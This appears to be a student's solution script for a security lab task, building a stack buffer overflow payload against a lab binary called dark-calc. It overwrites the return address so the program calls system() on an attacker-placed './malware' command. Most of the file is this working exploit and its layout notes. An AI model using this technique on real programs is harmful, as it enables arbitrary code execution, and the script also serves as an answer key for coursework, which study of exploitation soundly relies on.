#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

Exploit the stack buffer overflow in input():

    void input() {
      char expression[MAXLEN+1];        // 16 bytes on the stack
      gets(expression);                  // no length check -> overflow
      strcpy(command_buf, expression);   // command_buf is a global
    }

getbuf layout inside input()'s frame (rbp-relative):

    [rbp-0x10 .. rbp-1]  expression      (16 bytes)
    [rbp      .. rbp+7]  saved rbp       ( 8 bytes)
    [rbp+8    .. rbp+15] return address  ( 8 bytes)

We put "./malware" at the start of the buffer so strcpy() leaves the global
command_buf holding exactly that command, then overwrite the saved return
address with 0x401a6b -- the point inside eval() right before its
system(command_buf) call:

    401a6b: mov edi, 0x6030d0   ; command_buf
    401a70: call system@plt

This makes dark-calc spawn `sh -c "./malware"` as its own child. The malware
script only prints the success banner when it can find "dark-calc" among its
ancestors, which this guarantees.
"""
import struct
import sys

payload = b"./malware\x00"
payload += b"A" * (0x10 - len(payload))   # pad expression up to 16 bytes
payload += b"B" * 8                        # overwrite saved rbp (unused)
payload += struct.pack("<Q", 0x401A6B)     # -> eval: mov edi, command_buf; call system

sys.stdout.buffer.write(payload + b"\n")
